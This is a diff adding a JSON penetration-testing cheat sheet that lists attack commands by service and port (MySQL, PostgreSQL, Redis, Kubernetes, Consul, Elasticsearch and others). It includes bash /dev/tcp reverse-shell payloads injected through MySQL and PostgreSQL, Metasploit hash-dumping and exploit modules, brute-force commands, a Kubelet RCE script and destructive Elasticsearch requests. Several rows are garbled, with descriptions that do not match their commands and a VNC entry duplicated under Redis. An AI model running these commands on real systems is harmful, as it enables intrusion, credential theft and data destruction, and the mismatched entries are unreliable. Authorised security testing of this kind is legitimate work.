+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Extracting hashes from Mysql-server",
+     "command": "use auxiliary/scanner/mysql/mysql_hashdump\nset rhosts 192.168.1.108\nset username root\nset password 123\nexploit",
+     "command_desc": "extracting hashes with metasploit module with valid credentials",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Enumerate files and directories using the MySQL load_file feature",
+     "command": "use auxiliary/scanner/mysql/mysql_file_enum\nset rhosts 192.168.1.108\nset username root\nset password 123\nset file_list /root/dir.txt\nexploit",
+     "command_desc": "extracting files with metasploit module with valid credentials",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Checking Writable Directories",
+     "command": "use auxiliary/scanner/mysql/mysql_writable_dirs\nset rhosts 192.168.1.108\nset username root\nset password 123\nset dir_list /root/dir.txt\nexploit",
+     "command_desc": "checking for writetable directories using metasploit module",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Getting all the information from inside the database",
+     "command": "mysqldump -u admin -p admin --all-databases --skip-lock-tables",
+     "command_desc": "dumping all information using mysqldump with valid credentials",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Executing a Reverse Shell Through SQL Command Injection",
+     "command": "mysql> UPDATE hackviserdb.users SET email='hackviser@shell|| bash -c \"bash -i >& /dev/tcp/<ip_address>/<port> 0>&1\" &' WHERE name LIKE 'user%';",
+     "command_desc": "trying to execute reverseshell of sql server",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "postgresql-5432",
+   "name": "PostgreSQL",
+   "ports": [
+    5432
+   ],
+   "aliases": [
+    "postgresql"
+   ],
+   "intro": "PostgreSQL is an open-source relational database management system (RDBMS) that uses port 5432 by default; a network pentester can exploit this open port to attempt unauthorized access or data extraction from the database.",
+   "rows": [
+    {
+     "phase": "Connect",
+     "method": "",
+     "command": "psql -U <myuser> # Open psql console with use",
+     "command_desc": "connecting to postgresql",
+     "description": "",
+     "remarks": "these can be performed if username and password are already known",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "psql -h <host> -U <username> -d <database> # Remote connection",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "psql -h localhost -d <database_name> -U <User> #Password will be prompted",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "nmap",
+     "command": "auxiliary/scanner/postgres/postgres_version",
+     "command_desc": "this module which can be used to identify PostgreSQL databases and their version",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Brute Force Credentials",
+     "command": "hydra -l username -P passwords.txt <target-ip> postgres\nhydra -L usernames.txt -p password <target-ip> postgres\n\n# Metasploit\nmsfconsole\nmsf> use auxiliary/scanner/postgres/postgres_login\nmsf> set rhosts <target-ip>\nmsf> run",
+     "command_desc": "using hydra and metaslpoit module to bruteforce creds",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Dump User Hashes",
+     "command": "msfconsole\nmsf> use auxiliary/scanner/postgres/postgres_hashdump\nmsf> set rhosts <target-ip>\nmsf> set username <username>\nmsf> set password <password>\nmsf> run",
+     "command_desc": "dumbing hashes using msfconsole",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Post Exploitation",
+     "method": "Metasploit",
+     "command": "msfconsole\nmsf> use exploit/multi/postgres/postgres_copy_from_program_cmd_exec\nmsf> set rhosts <target-ip>\nmsf> set lhost <local-ip>\nmsf> set tablename <table_name>\nmsf> set username <username>\nmsf> set password <password>\nmsf> run\nshell",
+     "command_desc": "using msfconsle trying to create a new table and username and passwords",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Command injection",
+     "command": "DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"';\nSELECT * FROM cmd_exec;\nDROP TABLE IF EXISTS cmd_exec;",
+     "command_desc": "we can inject OS commands into the pgsql server",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "rabbitmq-5672-15672",
+   "name": "RabbitMQ",
+   "ports": [
+    5672,
+    15672
+   ],
+   "aliases": [
+    "amqp"
+   ],
+   "intro": "RabbitMQ is an open-source message broker that uses the Advanced Message Queuing Protocol (AMQP) for communication. It typically listens on two 5672 (AMQP), 15672 (HTTP API and Management Plugin). these ports can be used to identify misconfigurations, default credentials, and open access that could be exploited for unauthorized message consumption, message injection, or gaining administrative access to RabbitMQ instances.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "telnet <ip> 5672\ntelnet <ip> 15672",
+     "command_desc": "Banner grabbing is used to identify consul server versions. You can use the following tools to find banner grabbing",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "AMQP Enumeration",
+     "command": "nmap -sV -Pn -n -T4 -p 5672 --script amqp-info <IP>",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap enumeration",
+     "command": "nmap -p 5672,15672 IP  -sV  -sC -A",
+     "command_desc": "This command scans the specified IP address for consul vulnerabilities and information using all Nmap scripts on port 5672,15672",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Accessing web console",
+     "command": "Ip:5672   in browser",
+     "command_desc": "In this port you may find the RabbitMQ Management web console if the management plugin is enabled. The default credentials are \"guest\":\"guest\". If they aren't working you may try to brute-force the login.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Directory fuzzing",
+     "command": "dirsearch -u <IP>:port",
+     "command_desc": "checking for intresting directories by directory fuzzing",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Brute Force",
+     "command": "legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]",
+     "command_desc": "This command uses the legba tool to perform operations on an AMQP (Advanced Message Queuing Protocol) server running on localhost at port 5672. It attempts to connect using the username admin and tries multiple passwords from the file data/passwords.txt for authentication. The optional flag [--amql-ssl] indicates that the connection should be made using SSL/TLS if specified.",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "vnc-5900",
+   "name": "VNC",
+   "ports": [
+    5900,
+    5901
+   ],
+   "aliases": [
+    "vnc"
+   ],
+   "intro": "Virtual Network Computing (VNC) is a robust graphical desktop-sharing system that utilizes the Remote Frame Buffer (RFB) protocol to enable remote control and collaboration with another computer. With VNC, users can seamlessly interact with a remote computer by transmitting keyboard and mouse events bidirectionally. This allows for real-time access and facilitates efficient remote assistance or collaboration over a network.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "nmap script scan",
+     "command": "nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> <IP>",
+     "command_desc": "nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> <IP>: Scans the specified port for VNC service details, checks for RealVNC authentication bypass vulnerability, and retrieves the VNC session title.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "msf > use auxiliary/scanner/vnc/vnc_none_auth",
+     "command_desc": "Connect to vnc using Kali.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Brute force",
+     "command": "vncviewer [-passwd passwd.txt] <IP>::5901",
+     "command_desc": "Default password is stored in: ~/.vnc/passwd\n\nIf you have the VNC password and it looks encrypted (a few bytes, like if it could be an encrypted password), it is probably ciphered with 3des. You can get the clear text password using https://github.com/jeroennijhof/vncpwd\n\nmake\nvncpwd <vnc password file>\nYou can do this because the password used inside 3des to encrypt the plain-text VNC passwords was reversed years ago.\nFor Windows you can also use this tool: https://www.raymond.cc/blog/download/did/232/",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "redis-6379",
+   "name": "Redis",
+   "ports": [
+    6379
+   ],
+   "aliases": [
+    "redis"
+   ],
+   "intro": "The Redis protocol is highly efficient, making it a good fit for real-time applications that require quick reads/writes, caching, or message-brokering tasks.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "nmap script scan",
+     "command": "nmap --script redis-info -sV -p 6379 <IP>",
+     "command_desc": "Provides the basic info",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "msf> use auxiliary/scanner/redis/redis_server",
+     "command_desc": "Scans for open Redis servers and gathers basic information about them.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Redis-cli",
+     "command": "redis-cli -h <IP> # Check if the Redis server allows unauthenticated access.",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "redis-cli -h <IP> -p 6379\nAUTH <password>",
+     "command_desc": "Attempts to authenticate with a list of commonly used or default passwords. If successful, further actions can be performed on the server.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "redis-cli -h <IP> -p 6379 CONFIG GET *\nredis-cli -h <IP> -p 6379 KEYS *",
+     "command_desc": "CONFIG GET * retrieves all configuration settings, while KEYS * lists all keys stored in the database",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "redis-cli -h <IP> -p 6379 SET test \"This is a test\"",
+     "command_desc": "Test if arbitrary data can be written to the Redis database.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Brute force",
+     "command": "vncviewer [-passwd passwd.txt] <IP>::5901",
+     "command_desc": "Default password is stored in: ~/.vnc/passwd\n\nIf you have the VNC password and it looks encrypted (a few bytes, like if it could be an encrypted password), it is probably ciphered with 3des. You can get the clear text password using https://github.com/jeroennijhof/vncpwd\n\nmake\nvncpwd <vnc password file>\nYou can do this because the password used inside 3des to encrypt the plain-text VNC passwords was reversed years ago.\nFor Windows you can also use this tool: https://www.raymond.cc/blog/download/did/232/",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "kubernetes-6443-10259-10250",
+   "name": "Kubernetes",
+   "ports": [
+    6443,
+    10259,
+    10250,
+    10257
+   ],
+   "aliases": [
+    "kubernetes",
+    "sun-sr-https"
+   ],
+   "intro": "Kubernetes, often abbreviated as K8s, is an open-source container orchestration platform that automates the deployment, scaling, and management of containerized applications. It provides a robust framework for container orchestration, ensuring high availability, scalability, and flexibility.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner grabbing",
+     "command": "telnet <ip> 6443",
+     "command_desc": "Telnel will reveal the services running on the spesific port",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Service Enumeration",
+     "command": "nmap -sV -p 6443,2379,2380,10250 <target-ip>",
+     "command_desc": "service enumeration using nmap",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Identify the target Kubernetes cluster.",
+     "command": "kubectl cluster-info --server https://<target>:6443",
+     "command_desc": "The command kubectl cluster-info --server https://<target>:6443 retrieves and displays the Kubernetes cluster information by connecting to the specified API server at https://<target>:6443.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Inspect Node Components",
+     "command": "curl -k https://<target>:10250/pods\ncurl -k https://<target>:10250/logs/<namespace>/<pod-name>/<container-name>",
+     "command_desc": "These commands use curl to access the Kubelet's unsecured HTTPS endpoint, listing all running pods on a Kubernetes node and retrieving logs for a specific container within a pod.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "etcd Enumeration",
+     "command": "etcdctl --endpoints=https://<target>:2379 get / --prefix --keys-only",
+     "command_desc": "If etcd is accessible, query it for stored data (typically on port 2379 or 2380)",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Check for Exposed Dashboards and UIs",
+     "command": "kube-hunter --remote <target-ip>",
+     "command_desc": "Use kube-hunter to automatically scan for and identify exposed dashboards and UIs like Jaeger, Kibana, or custom dashboards on common web ports.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Checking for ETCD Anonymous Access",
+     "command": "etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only",
+     "command_desc": "This command lists all the keys stored in the etcd cluster running on the specified master node (<MASTER-IP>), without showing their values",
+     "description": "",
+     "remarks": "Take permission from project lean and client to exploit",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Kubelet RCE",
+     "command": "python3 kubelet-anon-rce.py           \\\n          --node 10.1.2.3               \\\n          --namespace kube-system       \\\n          --pod tiller-797d1b1234-gb6qt \\\n          --container tiller            \\\n          --exec \"ls /tmp\"",
+     "command_desc": "This command attempts to execute a remote code execution (RCE) attack on a Kubernetes cluster by exploiting an anonymous access vulnerability in the Kubelet API",
+     "description": "",
+     "remarks": "Take permission from project lean and client to exploit",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "consul-8500",
+   "name": "Consul",
+   "ports": [
+    8500
+   ],
+   "aliases": [
+    "consul"
+   ],
+   "intro": "Consul's port 8500 is the default HTTP API and web interface port used for service discovery and configuration management in distributed systems. For network pentesters, it can be exploited to gain insights into the network's architecture or potentially manipulate service configurations if left unsecured.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "telnet <ip> 8500",
+     "command_desc": "Banner grabbing is used to identify consul server versions. You can use the following tools to find banner grabbing",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "nmap enumeration",
+     "command": "nmap -p 8500 <IP>  -sV  -sC -A",
+     "command_desc": "This command scans the specified IP address for consul vulnerabilities and information using all Nmap cumsul-related scripts on port 8500.",
+     "description": "",
+     "remarks": "Performing an Nmap script scan can generate a lot of traffic, so please make sure to inform the project lead and the client before running the scan. It is better to select specific scripts and run them individually. You can find these scripts with the following command: ls -al /usr/share/nmap/scripts/ | grep -e consul",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Metasploit exploit module",
+     "command": "use exploit/multi/misc/consul_service_exec\nset RHOSTS 192.34.49.3\nexploit",
+     "command_desc": "Useing Metasploit exploit module to exploit the target. Successfully exploiting this gains the remote shell",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "cassandra-9042-9160-nosql-da",
+   "name": "Cassandra",
+   "ports": [
+    9042,
+    9160
+   ],
+   "aliases": [
+    "cassandra"
+   ],
+   "intro": "Apache Cassandra is used for the Thrift protocol, which was the original client-server protocol for interacting with Cassandra. Thrift allows clients to communicate with the Cassandra database and perform operations like reading and writing data.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "nc -v <target_ip> 9042",
+     "command_desc": "this command uses netcat to perform a verbose connection attempt to the IP address X.X.X.X on port 9042",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap Script",
+     "command": "nmap -sV --script cassandra-info -p <PORT> <IP>",
+     "command_desc": "This script provide the cassandra info",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap",
+     "command": "nmap -p 9042,9160 <target_ip> -sV",
+     "command_desc": "uses Nmap to scan the specified IP address on port 9042,9160",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Cqlsh",
+     "command": "cqlsh <target_ip> 9042",
+     "command_desc": "This tries to connect to Cassandra's native CQL service without providing credentials. If you're able to connect and run queries, it means authentication is not enforced.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Telnet or Thrift-clinet",
+     "command": "telnet <target_ip> 9160",
+     "command_desc": "Check if unauthenticated access is allowed. If it succeeds, you can attempt queries or administrative actions on the Cassandra database",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Query Injection",
+     "command": "SELECT * FROM system.local WHERE key = 'local' OR 1=1;",
+     "command_desc": "This query attempts to exploit potential CQL injection vulnerabilities by injecting OR 1=1, a classic SQL injection method that may bypass filters or return unauthorized data.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "Check for any exploits for cassandra modules",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Brute Force CredentialsUsing Hydra",
+     "command": "hydra -l <username> -P <password_list> cassandra://<target_ip>:9042",
+     "command_desc": "Brute forcing and guessing username and password for getting mysql credentials using hydra tool",
+     "description": "",
+     "remarks": "Perform brute force based enumeration or attacks with concern of project lead and client knowledge.",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "elasticsearch",
+   "name": "Elasticsearch",
+   "ports": [
+    9200,
+    9300,
+    9600
+   ],
+   "aliases": [
+    "elasticsearch"
+   ],
+   "intro": "An Elasticsearch index is a collection of related documents stored as JSON. Each document consists of keys and their corresponding values (strings, numbers, booleans, dates, arrays, geolocations, etc.).\n\nElasticsearch uses an efficient data structure called an inverted index to facilitate fast full-text searches. This index lists every unique word in the documents and identifies the documents in which each word appears.\n\nDuring the indexing process, Elasticsearch stores the documents and constructs the inverted index, allowing for near real-time searching. The index API is used to add or update JSON documents within a specific index.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "crul",
+     "command": "curl http://<elasticsearch_ip>:9200/_cat/indices?v\ncurl http://<elasticsearch_ip>:9200/<index_name>/_search",
+     "command_desc": "If successful, you’ll see index data, exposing potentially sensitive information",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Hydra",
+     "command": "rpcclient -U \"\" <target_ip>\n> srvinfo\n> enumdomusers\n> lsaenumsid",
+     "command_desc": "hydra -l elasticuser -P password_list.txt <elasticsearch_ip> http-get / -s 9200",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Check for inscure api access",
+     "command": "curl -X DELETE http://<elasticsearch_ip>:9200/my_index\ncurl -X POST http://<elasticsearch_ip>:9200/my_index/_doc -H 'Content-Type: application/json' -d '{\"name\": \"malicious_data\"}'curl -X GET",
+     "command_desc": "This will list available shares and allow anonymous access.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Check for directory traversal",
+     "command": "Try to access sensitive files by crafting malicious paths in search requests",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Check for sesnsitive data exposure",
+     "command": "curl http://<elasticsearch_ip>:9200/_snapshot\ncurl -X GET http://<elasticsearch_ip>:9200/my_index/_search?q=credit_card",
+     "command_desc": "Any sensitive information (credit cards, passwords, PII) exposed should be flagged.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "memecache-11211",
+   "name": "Memcached",
+   "ports": [
+    11211
+   ],
+   "aliases": [
+    "memcached"
+   ],
+   "intro": "",
+   "rows": [
+    {
+     "phase": "What is Memcache?",
+     "method": "is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.",
+     "command": "",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "Nmap",
+     "command": "nmap -n -sV --script memcached-info -p 11211 <IP>   #Just gather info\nmsf > use auxiliary/gather/memcached_extractor      #Extracts saved data\nmsf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible",
+     "command_desc": "nmap -n -sV --script memcached-info -p 11211 <IP>: Gathers information about the Memcached service running on port 11211.\nmsf > use auxiliary/gather/memcached_extractor: Extracts stored data from the Memcached server.\nmsf > use auxiliary/scanner/memcached/memcached_amp: Checks if the Memcached server is vulnerable to UDP DDoS amplification attacks.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "Dumping Keys",
+     "command": "stats cachedump <slab class> <number of items to dump>",
+     "command_desc": "For versions prior to 1.4.31, keys are dumped by slab class using:",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "mongo-db-27017",
+   "name": "MongoDB",
+   "ports": [
+    27017
+   ],
+   "aliases": [
+    "mongodb",
+    "mongod"
+   ],
+   "intro": "MongoDB is a popular, open-source, NoSQL (non-relational) database designed to handle large volumes of unstructured or semi-structured data. Unlike traditional relational databases that store data in tables with rows and columns, MongoDB uses a flexible, document-oriented data model, making it highly scalable and performant for modern applications.",
+   "rows": [
+    {
+     "phase": "Enumeration",
+     "method": "Banner Grabbing",
+     "command": "nc -v <target_ip> 27017",
+     "command_desc": "this command uses netcat to perform a verbose connection attempt to the IP address X.X.X.X on port 27017",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap Script",
+     "command": "nmap -sV --script \"mongo* and default\" -p 27017 <IP>",
+     "command_desc": "By default all the nmap mongo enumerate scripts are used",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Basic DB Commands",
+     "command": "show dbs\nuse <db>\nshow collections\ndb.<collection>.find()  #Dump the collection\ndb.<collection>.count() #Number of records of the collection\ndb.current.find({\"username\":\"admin\"})  #Find in current db the username admin",
+     "command_desc": "uses Nmap to scan the specified IP address on port 9042,9160",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Nmap",
+     "command": "nmap -n -sV --script mongodb-brute -p 27017 <ip>",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "Exploitation",
+     "method": "mongo shell",
+     "command": "mongo <HOST>\nmongo <HOST>:<PORT>\nmongo <HOST>:<PORT>/<DB>\nmongo <database> -u <username> -p '<password>'",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "Check for any exploits for cassandra modules",
+     "command_desc": "",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  }
+ ],
+ "methodology": [
+  {
+   "key": "initial-enumeration",
+   "name": "Initial-enumeration",
+   "intro": "",
+   "rows": [
+    {
+     "phase": "",
+     "method": "Open Port scan",
+     "command": "nmap -sC -sV -T4 -A -O -Pn -p- <ip>",
+     "command_desc": "",
+     "description": "Initially on a normal network the following nmap command will give you the entire port, service, nse scripts, os detection, enumeration results",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Telnet check",
+     "command": "telnet <ip> <port>",
+     "command_desc": "",
+     "description": "Checking if ip address accepts telnet connection",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Ports scan using telnet",
+     "command": "Here is a simple telnet script using python to scan 1-65535 ports of  a single Ip.\nhttps://github.com/vasuhacks7/telnet-port-scan",
+     "command_desc": "",
+     "description": "Identify open ports of the ID by attempting to connect to them using telnet.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Port scan using nmap",
+     "command": "nmap -p- <ip>",
+     "command_desc": "",
+     "description": "Identify open ports using nmap if telnet is not accepted",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "TCP Fin Scan using nmap",
+     "command": "nmap -p- -sF <ip>",
+     "command_desc": "",
+     "description": "Identify the open ports using nmap on TCP",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "UDP port scan using nmap",
+     "command": "nmap -sU <ip>",
+     "command_desc": "",
+     "description": "Identify udp open ports using nmap",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Service Enumeration",
+     "command": "nmap -p{ports} -sV -sC <ip> -oN nmap-services",
+     "command_desc": "",
+     "description": "Identify services versions of open ports which are identifiled by telnet or nmap",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Bypass scans using nmap for port enumeration",
+     "command": "nmap -p- -sC -sV -T4 -Pn <ip>",
+     "command_desc": "",
+     "description": "Use the command when ping server is disabled on the target network",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "nmap -p- -sC -sV -T4 -sX <ip>",
+     "command_desc": "",
+     "description": "Use xmas scan for bypassing the firewall detection",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "nmap -sF -p1-100 -T4 <ip>",
+     "command_desc": "",
+     "description": "FIN scan against stateless firewall",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "nmap -sS -v -v -Pn -g 88 172.25.0.14",
+     "command_desc": "",
+     "description": "Bypassing Windows IPsec filter using source port 88. (with using source port 88 we can able to scan and perform entire ports on the target systems.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "nmap -6 www.kame.net/ipv6",
+     "command_desc": "",
+     "description": "If we want to perform an extensive scan on ipv6 then the following command will be used.",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "",
+     "command": "nmap -n -sn -PE -T4 10.10.10.0/24",
+     "command_desc": "",
+     "description": "If only ping scan is enabled on the target network then the following command can be used",
+     "remarks": "",
+     "reference": ""
+    }
+   ]
+  },
+  {
+   "key": "enumerating-ports",
+   "name": "Enumerating  Ports",
+   "intro": "When it comes to network VAPT there will be services that are very commonly seen, for example, HTTP, SSH, FTP, and more. But then there are services that are not widely used, these services are deployed on the network for a specific usage. These services can give us an idea of the network architecture and use case.",
+   "rows": [
+    {
+     "phase": "Understanding the service",
+     "method": "Researching the port: https://www.speedguide.net/ports.php - This website will give us info on what services, exploits and malware use what ports\nWe can enumerate using the port number and fetch info like protocol, services and service details.\nhttps://whatportis.com/ports - This website give us an idea on which ports are commonly used and which may have security threats to them and can be exploited.\nhttps://tcp-udp-ports.com/ - Port details based on OS , Services and information on each port\n\nResearching the service: Once the service is confirmed by Nmap scan and speedguide.net. we can do a quick Google search \"Enumerating <service-name>\"\nIf we have results from websites like\nhttps://book.hacktricks.xyz/ - this website provides a guide on pen-testing this service\nAny github repo - can give us an understanding of the service, it can also be some service enumerating script.\nRapid7 - msf modules that can be used against this service.\nnmap - NSE script against this service\nOther - we can find other interesting websites and articles on the service which can give us an understanding on the service.\n\nUnderstanding the environment: While researching the service we also get an idea of what kind of environment uses this service. Based on the environment this service can be used for information gathering, exploitation, or any post-exploitation attacks.\nRefer to all other technical blogs in the search results to get an idea on the service and the environment. We can also do a Google search combining the service and the port \"<service> port\" and we can have multiple articles on the usage of that service. This will also give us an idea on which devices these services are used.\n\nCTFs Related to Service: We can search \"<service> CTF\" and we will find results with some blogs and posts for CTFs in which this service was used or seen. This gives us an idea on how to approach this service and what are few attack vectors.",
+     "command": "-",
+     "command_desc": "-",
+     "description": "",
+     "remarks": "This is a research phase. The idea here is to understand the service, and maybe find some interesting scripts that can be used in the process of understanding the service.\nWe are not worried about exploitation at this phase we want to understand the service and its use case.",
+     "reference": ""
+    },
+    {
+     "phase": "Enumeration",
+     "method": "nmap",
+     "command": "nmap -p <port-number> -A -Pn -vvv <target-ip>\nnmap -p <port-number> --script <NSE-scripts for the service>",
+     "command_desc": "The first Nmap command runs an Aggressive scan against the port and service with default scripts while assuming the port and service are up and running.\nThe second Nmap command accepts NSE scripts and runs those scripts against the services. Some of these scripts also accept arguments.",
+     "description": "",
+     "remarks": "Read all the information about the scripts before running them against any service and some of them may case denial or unavailability of that service.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Github Script",
+     "command": "<service> enumeration github scripts",
+     "command_desc": "Open source github scripts can be used but make sure that the scripts is made for enumeration purpose and not for exploitation purpose.",
+     "description": "",
+     "remarks": "Make sure to read the scripts as those scripts can contain malicious codes which might lead to an unexpected turn of events.",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "GitBooks, Books",
+     "command": "-",
+     "command_desc": "Online pentest books are available which contains all the tools and processes of pentesting a particular service.",
+     "description": "",
+     "remarks": "",
+     "reference": ""
+    },
+    {
+     "phase": "",
+     "method": "Metasploit",
+     "command": "/use/auxiliary/",
+     "command_desc": "We can search for all the auxiliary modules related to that service available on Metasploit and use the same to enumerate the services.",
+     "description": "",
